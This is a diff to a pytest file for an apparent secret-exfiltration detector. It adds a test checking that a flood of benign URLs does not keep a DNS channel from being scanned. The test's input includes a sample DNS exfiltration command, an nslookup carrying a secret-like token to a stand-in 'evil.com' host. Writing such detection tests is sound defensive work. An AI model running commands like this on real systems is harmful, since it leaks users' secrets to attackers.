@@ -146,7 +146,17 @@ def test_find_exfil_over_websocket():
 
 
 def test_find_urls_bounded():
-    assert len(find_urls(" ".join(f"https://h{i}.example" for i in range(500)))) == canary.MAX_URLS
+    # per-channel budget (not a single global cap): a flood of one channel is capped at MAX_URLS_PER_CHANNEL
+    assert len(find_urls(" ".join(f"https://h{i}.example" for i in range(500)))) == canary.MAX_URLS_PER_CHANNEL
+
+
+def test_find_urls_flood_does_not_starve_scheme_less_channels():
+    # a flood of benign `bare` URLs must NOT exhaust the budget before the later scheme-less stealth channels are
+    # scanned — otherwise a secret smuggled via a scheme-less dns host would never be checked (exfil false negative)
+    flood = " ".join(f"https://h{i}.example" for i in range(500))
+    urls = find_urls(flood + " nslookup K7QM-2XPA-3RTD-H4WB.data.evil.com")
+    assert len([u for u in urls if u[0] == "bare"]) == canary.MAX_URLS_PER_CHANNEL
+    assert any(ch == "dns" for ch, _ in urls)   # the dns host is still reached despite the flood
 
 
 @pytest.mark.parametrize("make", [
